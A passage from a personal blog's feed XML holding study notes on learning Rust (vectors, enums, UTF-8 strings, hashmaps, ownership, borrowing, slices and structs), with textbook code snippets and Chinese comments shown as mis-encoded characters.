element."</span>),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let mut v = vec![<span class="number">100</span>, <span class="number">32</span>, <span class="number">57</span>];</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> &amp;mut v &#123;</span><br><span class="line">        *i += <span class="number">50</span>; //è§£å¼•ç”¨ dereference operator (*) to get to the value <span class="keyword">in</span> i</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    enum SpreadsheetCell &#123;</span><br><span class="line">        Int(i32),</span><br><span class="line">        Float(f64),</span><br><span class="line">        Text(String),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    let row = vec![  //vecç±»å‹ä¸ºSpreadsheetCell å®é™…ä¸Šå­˜å‚¨ä¸åŒç±»å‹å€¼</span><br><span class="line">        SpreadsheetCell::Int(<span class="number">3</span>),</span><br><span class="line">        SpreadsheetCell::Text(String::from(<span class="string">"blue"</span>)),</span><br><span class="line">        SpreadsheetCell::Float(<span class="number">10.12</span>),</span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æšä¸¾è¦é…åˆmatchä½¿ç”¨</p><h3 id="string"><a href="#string" class="headerlink" title="string"></a>string</h3><p>Remember that<code>strings are UTF-8</code>encoded,<br><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let hello = String::from(<span class="string">"Ø§Ù„Ø³Ù„Ø§Ù… Ø¹Ù„ÙŠÙƒÙ…"</span>);</span><br><span class="line">    let hello = String::from(<span class="string">"DobrÃ½ den"</span>);</span><br><span class="line">    let hello = String::from(<span class="string">"Hello"</span>);</span><br><span class="line">    let hello = String::from(<span class="string">"×©Ö¸××œ×•Ö¹×"</span>);</span><br><span class="line">    let hello = String::from(<span class="string">"à¤¨à¤®à¤¸à¥à¤¤à¥‡"</span>);</span><br><span class="line">    let hello = String::from(<span class="string">"ã“ã‚“ã«ã¡ã¯"</span>);</span><br><span class="line">    let hello = String::from(<span class="string">"ì•ˆë…•í•˜ì„¸ìš”"</span>);</span><br><span class="line">    let hello = String::from(<span class="string">"ä½ å¥½"</span>);</span><br><span class="line">    let hello = String::from(<span class="string">"OlÃ¡"</span>);</span><br><span class="line">    let hello = String::from(<span class="string">"Ğ—Ğ´Ñ€Ğ°Ğ²ÑÑ‚Ğ²ÑƒĞ¹Ñ‚Ğµ"</span>);</span><br><span class="line">    let hello = String::from(<span class="string">"Hola"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let mut s = String::from(<span class="string">"foo"</span>);</span><br><span class="line">    s.push_str(<span class="string">"bar"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let mut s = String::from(<span class="string">"lo"</span>);</span><br><span class="line">    s.push(<span class="string">'l'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>push method takes<code>a single character</code></p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let s1 = String::from(<span class="string">"Hello, "</span>);</span><br><span class="line">    let s2 = String::from(<span class="string">"world!"</span>);</span><br><span class="line">    let s3 = s1 + &amp;s2; // note s1 has been moved here and can no longer be used//be moved into the add call and no longer be valid after that.</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> add is that the compiler can coerce the &amp;String argument into a &amp;str</p><h4 id="format"><a href="#format" class="headerlink" title="format"></a>format</h4><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let s1 = String::from(<span class="string">"tic"</span>);</span><br><span class="line">    let s2 = String::from(<span class="string">"tac"</span>);</span><br><span class="line">    let s3 = String::from(<span class="string">"toe"</span>);</span><br><span class="line"></span><br><span class="line">    let s = format!(<span class="string">"&#123;&#125;-&#123;&#125;-&#123;&#125;"</span>, s1, s2, s3); //doesnâ€™t take ownership of any of its parameters.</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>utf-8</code>å¯å˜å­—èŠ‚ 1-4å­—èŠ‚ï¼Œæœ‰äº›ä¸€ä¸ªå­—èŠ‚ æœ‰äº›4ä¸ªå­—èŠ‚</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[allow(unused_variables)]</span><br><span class="line">fn main() &#123;</span><br><span class="line">let hello = <span class="string">"Ğ—Ğ´Ñ€Ğ°Ğ²ÑÑ‚Ğ²ÑƒĞ¹Ñ‚Ğµ"</span>;</span><br><span class="line"></span><br><span class="line">let s = &amp;hello[<span class="number">0.</span><span class="number">.4</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#![allow(unused_variables)]</span></span><br><span class="line">fn main() &#123;</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">"à¤¨à¤®à¤¸à¥à¤¤à¥‡"</span>.chars() &#123;</span><br><span class="line">    println!(<span class="string">"&#123;&#125;"</span>, c);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#![allow(unused_variables)]</span></span><br><span class="line">fn main() &#123;</span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> <span class="string">"à¤¨à¤®à¤¸à¥à¤¤à¥‡"</span>.bytes() &#123; // returns each raw byte,</span><br><span class="line">    println!(<span class="string">"&#123;&#125;"</span>, b);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="hashmap"><a href="#hashmap" class="headerlink" title="hashmap"></a>hashmap</h3><p><code>all of the keys</code> must have the<code>same type</code>, and all of the<code>values</code>must have the<code>same type.</code><br><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    use std::collections::HashMap;</span><br><span class="line">    let mut scores = HashMap::new();</span><br><span class="line">    scores.insert(String::from(<span class="string">"Blue"</span>), <span class="number">10</span>);</span><br><span class="line">    scores.insert(String::from(<span class="string">"Yellow"</span>), <span class="number">50</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    use std::collections::HashMap;</span><br><span class="line"></span><br><span class="line">    let teams = vec![String::from(<span class="string">"Blue"</span>), String::from(<span class="string">"Yellow"</span>)];</span><br><span class="line">    let initial_scores = vec![<span class="number">10</span>, <span class="number">50</span>];</span><br><span class="line"></span><br><span class="line">    let mut scores: HashMap&lt;_, _&gt; =</span><br><span class="line">        teams.into_iter().zip(initial_scores.into_iter()).collect();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>zip</code>method to create a vector of tuples<br><code>collect</code>method to turn that vector of tuples into a hash map,</p><p>For types that implement the <code>Copy trait</code>, like i32, the values<code>are copied into</code> the hash map. For owned values like String, the values will be moved and the hash map will be the <code>owner of those values</code></p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    use std::collections::HashMap;</span><br><span class="line"></span><br><span class="line">    let mut scores = HashMap::new();</span><br><span class="line"></span><br><span class="line">    scores.insert(String::from(<span class="string">"Blue"</span>), <span class="number">10</span>);</span><br><span class="line">    scores.insert(String::from(<span class="string">"Yellow"</span>), <span class="number">50</span>);</span><br><span class="line"></span><br><span class="line">    let team_name = String::from(<span class="string">"Blue"</span>);</span><br><span class="line">    let score = scores.get(&amp;team_name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Some(&amp;10). The result is wrapped in Some because get returns an Option&lt;&amp;V&gt;<br>no value get will return None.</p><pre><code>for (key, value) in &amp;scores {    println!(&quot;{}: {}&quot;, key, value);}</code></pre><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    use std::collections::HashMap;</span><br><span class="line"></span><br><span class="line">    let mut scores = HashMap::new();</span><br><span class="line">    scores.insert(String::from(<span class="string">"Blue"</span>), <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    scores.entry(String::from(<span class="string">"Yellow"</span>)).or_insert(<span class="number">50</span>);  //entryæ£€æŸ¥å€¼æ˜¯å¦å­˜åœ¨ï¼Œè¿”å›Entryï¼Œ or_insertæ˜¯Entryçš„æ–¹æ³• <span class="keyword">return</span> a mutable reference to the value   æ²¡æœ‰å€¼æ’å…¥</span><br><span class="line">    scores.entry(String::from(<span class="string">"Blue"</span>)).or_insert(<span class="number">50</span>);</span><br><span class="line"></span><br><span class="line">    println!(<span class="string">"&#123;:?&#125;"</span>, scores); //&#123;<span class="string">"Yellow"</span>: <span class="number">50</span>, <span class="string">"Blue"</span>: <span class="number">10</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    use std::collections::HashMap;</span><br><span class="line"></span><br><span class="line">    let text = <span class="string">"hello world wonderful world"</span>;</span><br><span class="line"></span><br><span class="line">    let mut map = HashMap::new();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> text.split_whitespace() &#123;</span><br><span class="line">        let count = map.entry(word).or_insert(<span class="number">0</span>); //or_insert method actually returns a mutable reference (&amp;mut V) æ‰€ä»¥å¯ä»¥åŠ <span class="number">1</span></span><br><span class="line">        *count += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    println!(<span class="string">"&#123;:?&#125;"</span>, map);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;Debug&quot;&gt;&lt;a href=&quot;#Debug&quot; class=&quot;headerlink&quot; title=&quot;Debug&quot;&gt;&lt;/a&gt;Debug&lt;/h3&gt;&lt;p&gt;The &lt;code&gt;Debug trait&lt;/code&gt;enables us to print our struct in a way that is useful for developers so we can see its value while weâ€™re debugging our code.&lt;br&gt;
    
    </summary>
    
    
      <category term="RUST" scheme="http://finsenty54.github.io/tags/RUST/"/>
    
  </entry>
  
  <entry>
    <title>RUSTå­¦ä¹ 2</title>
    <link href="http://finsenty54.github.io/2020/07/29/RUST%E5%AD%A6%E4%B9%A02/"/>
    <id>http://finsenty54.github.io/2020/07/29/RUSTå­¦ä¹ 2/</id>
    <published>2020-07-29T01:33:06.000Z</published>
    <updated>2020-07-29T01:34:09.636Z</updated>
    
    <content type="html"><![CDATA[<h3 id="rust"><a href="#rust" class="headerlink" title="rust"></a>rust</h3><p>All data <code>stored on the stack must have a known, fixed size.</code>Data with an unknown size at compile time or a size that might change must be stored on the heap instead.</p><p>Pushing to<code>the stack is faster than allocating on the heap</code> because the allocator never has to search for a place to store new data;<br><a id="more"></a></p><h3 id="Ownership-Rules"><a href="#Ownership-Rules" class="headerlink" title="Ownership Rules"></a>Ownership Rules</h3><p>è§£å†³å †ä¸Šæ•°æ® çš„é—®é¢˜</p><p>Each value in Rust has a variable thatâ€™s called its owner.<br>There can only <code>be one owner at a time.</code><br>When the <code>owner goes out of scope,</code>the value will be dropped. <code>ä»å †ä¸­å›æ”¶</code></p><p>string å­˜åœ¨scopeä¸­</p><p>the concept of copying the pointer, length, and capacity without copying the data probably sounds like making a shallow copy. </p><p>rust<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">let s1 = String::from(<span class="string">"hello"</span>);</span><br><span class="line">  <span class="params">|         -- move occurs because `s1` has type `std::string::String`, which does <span class="keyword">not</span> implement the `Copy` trait</span></span><br><span class="line"><span class="params">3 |</span>     let s2 = s1;</span><br><span class="line">  <span class="params">|              -- value moved here</span></span><br></pre></td></tr></table></figure></p><p>s1 æ— æ•ˆ å›æ”¶åªs2</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let s1 = String::from(<span class="string">"hello"</span>);</span><br><span class="line">    let s2 = s1.clone();</span><br><span class="line"></span><br><span class="line">    println!(<span class="string">"s1 = &#123;&#125;, s2 = &#123;&#125;"</span>, s1, s2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x=<span class="number">5</span></span><br><span class="line">y=x</span><br></pre></td></tr></table></figure><p><code>æ ˆä¸­ä¸ç”¨clone</code><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let s = String::from(<span class="string">"hello"</span>);  <span class="regexp">//</span> s comes into scope</span><br><span class="line"></span><br><span class="line">    takes_ownership(s);             <span class="regexp">//</span> s<span class="string">'s value moves into the function...</span></span><br><span class="line"><span class="string">                                    // ... and so is no longer valid here</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    let x = 5;                      // x comes into scope</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    makes_copy(x);                  // x would move into the function,</span></span><br><span class="line"><span class="string">                                    // but i32 is Copy, so itâ€™s okay to still</span></span><br><span class="line"><span class="string">                                    // use x afterward</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125; // Here, x goes out of scope, then s. But because s'</span>s value was moved, nothing</span><br><span class="line">  /<span class="regexp">/ special happens.</span></span><br></pre></td></tr></table></figure></p><h3 id="References-and-Borrowing"><a href="#References-and-Borrowing" class="headerlink" title="References and Borrowing"></a>References and Borrowing</h3><p>å¼•ç”¨ ä¸æ‹¿æ‰€æœ‰æƒ ä¹Ÿç§°å€Ÿ<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let mut s = String::from(<span class="string">"hello"</span>);</span><br><span class="line"></span><br><span class="line">    change(&amp;mut s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fn change(<span class="symbol">some_string:</span> &amp;mut String) &#123;</span><br><span class="line">    some_string.push_str(<span class="string">", world"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ä¸€ä¸ªå¯å˜å˜é‡åªèƒ½å¼•ç”¨ä¸€æ¬¡</code><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let mut s = String::from(<span class="string">"hello"</span>);</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        let r1 = &amp;mut s;</span><br><span class="line">    &#125; /<span class="regexp">/ r1 goes out of scope here, so we can make a new reference with no problems.</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">    let r2 = &amp;mut s;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure></p><p>ç”¨èŠ±æ‹¬å·åˆ›å»ºä¸€ä¸ªç©ºé—´ï¼Œæ¥å¼•ç”¨ï¼Œ</p><p> We also cannot have a mutable reference while we have an immutable one.<br><code>å¯å˜å˜é‡æœ‰ä¸å˜å¼•ç”¨åï¼Œä¸èƒ½åˆ›å»ºå¯å˜å¼•ç”¨</code></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let mut s = String::from(<span class="string">"hello"</span>);</span><br><span class="line"></span><br><span class="line">    let r1 = &amp;s; <span class="regexp">//</span> no problem</span><br><span class="line">    let r2 = &amp;s; <span class="regexp">//</span> no problem</span><br><span class="line">    println!(<span class="string">"&#123;&#125; and &#123;&#125;"</span>, r1, r2);</span><br><span class="line">    /<span class="regexp">/ r1 and r2 are no longer used after this point</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">    let r3 = &amp;mut s; /</span><span class="regexp">/ no problem</span></span><br><span class="line"><span class="regexp">    println!("&#123;&#125;", r3);</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><p><strong>å¼•ç”¨èŒƒå›´ä»åˆ›å»ºåˆ°æœ€åä¸€æ¬¡ä½¿ç”¨<br>å…³é”®æ˜¯ä¸é‡å </strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let reference_to_nothing = dangle();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn dangle() -&gt; &amp;String &#123; <span class="regexp">//</span> dangle returns a reference to a String</span><br><span class="line"></span><br><span class="line">    let s = String::from(<span class="string">"hello"</span>); <span class="regexp">//</span> s is a new String</span><br><span class="line"></span><br><span class="line">    &amp;s /<span class="regexp">/ we return a reference to the String, s</span></span><br><span class="line"><span class="regexp">&#125; /</span><span class="regexp">/ Here, s goes out of scope, and is dropped. Its memory goes away.</span></span><br><span class="line"><span class="regexp">  /</span><span class="regexp">/ Danger!</span></span><br></pre></td></tr></table></figure><h3 id="slice"><a href="#slice" class="headerlink" title="slice"></a>slice</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fn first_word(<span class="symbol">s:</span> &amp;String) -&gt; usize &#123;</span><br><span class="line">    let bytes = s.as_bytes();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i, &amp;item) <span class="keyword">in</span> bytes.iter().enumerate() &#123;</span><br><span class="line">        <span class="keyword">if</span> item == b<span class="string">' '</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    s.len()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>iter</code>is a method that returns each element in a collection<br><code>enumerate</code> wraps the result of iter and returns each element as part of a tuple instead.<br><code>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç´¢å¼•å€¼ï¼Œç¬¬äºŒä¸ªæ˜¯å€¼çš„å¼•ç”¨</code></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let s = String::from(<span class="string">"hello world"</span>);</span><br><span class="line"></span><br><span class="line">    let hello = &amp;s[<span class="number">0</span>..<span class="number">5</span>]; <span class="regexp">//</span><span class="number">0</span>å¯ä»¥çœå»</span><br><span class="line">    let world = &amp;s[<span class="number">6</span>..<span class="number">11</span>]; å­˜<span class="number">6</span>-<span class="number">10</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="string-slices"><a href="#string-slices" class="headerlink" title="string slices"></a>string slices</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">let s = String::from(<span class="string">"hello"</span>);</span><br><span class="line"></span><br><span class="line">let len = s.len();</span><br><span class="line"></span><br><span class="line">let slice = &amp;s[<span class="number">3</span>..len];</span><br><span class="line">let slice = &amp;s[<span class="number">3</span>..]; <span class="regexp">//</span>ç›¸åŒ</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The type that signifies â€œstring sliceâ€ is written as &amp;str:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fn first_word(<span class="symbol">s:</span> &amp;String) -&gt; &amp;str &#123;</span><br><span class="line">    let bytes = s.as_bytes();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i, &amp;item) <span class="keyword">in</span> bytes.iter().enumerate() &#123;</span><br><span class="line">        <span class="keyword">if</span> item == b<span class="string">' '</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> &amp;s[<span class="number">0</span>..i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &amp;s[..]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>String Literals Are Slices<br>å›ºå®šå­—ç¬¦ä¸²å°±æ˜¯ä¸€ç§åˆ‡ç‰‡<br>The type of s here is &amp;str<br>itâ€™s a slice pointing to that specific point of the binary</p><p>fn first_word(s: &amp;str) -&gt; &amp;str {<br><code>å¯ä»¥æ¥å—&amp;String å’Œ &amp;str</code> //String å’Œ å­—ç¬¦ä¸² å¦‚â€œhelloâ€</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">let a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">let slice = &amp;a[<span class="number">1</span>..<span class="number">3</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="struct"><a href="#struct" class="headerlink" title="struct"></a>struct</h3><p>ç»“æ„ä½“å­—æ®µé‡Œéƒ½æ˜¯å¯å˜çš„<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">struct User &#123;</span><br><span class="line">    <span class="symbol">username:</span> String,</span><br><span class="line">    <span class="symbol">email:</span> String,</span><br><span class="line">    <span class="symbol">sign_in_count:</span> u64,</span><br><span class="line">    <span class="symbol">active:</span> bool,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">struct User &#123;</span><br><span class="line">    <span class="symbol">username:</span> String,</span><br><span class="line">    <span class="symbol">email:</span> String,</span><br><span class="line">    <span class="symbol">sign_in_count:</span> u64,</span><br><span class="line">    <span class="symbol">active:</span> bool,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let user1 = User &#123;</span><br><span class="line">        <span class="symbol">email:</span> String::from(<span class="string">"someone@example.com"</span>),</span><br><span class="line">        <span class="symbol">username:</span> String::from(<span class="string">"someusername123"</span>),</span><br><span class="line">        <span class="symbol">active:</span> <span class="literal">true</span>,</span><br><span class="line">        <span class="symbol">sign_in_count:</span> <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>é¡ºåºéšä¾¿<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct User &#123;</span><br><span class="line">    <span class="symbol">username:</span> String,</span><br><span class="line">    <span class="symbol">email:</span> String,</span><br><span class="line">    <span class="symbol">sign_in_count:</span> u64,</span><br><span class="line">    <span class="symbol">active:</span> bool,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fn build_user(<span class="symbol">email:</span> String, <span class="symbol">username:</span> String) -&gt; User &#123; <span class="regexp">//</span>è¿”å›struct å®ä¾‹</span><br><span class="line">    User &#123;</span><br><span class="line">        <span class="symbol">email:</span> email,</span><br><span class="line">        <span class="symbol">username:</span> username,</span><br><span class="line">        <span class="symbol">active:</span> <span class="literal">true</span>,</span><br><span class="line">        <span class="symbol">sign_in_count:</span> <span class="number">1</span>,</span><br><span class="line">    &#125;</span><br><span 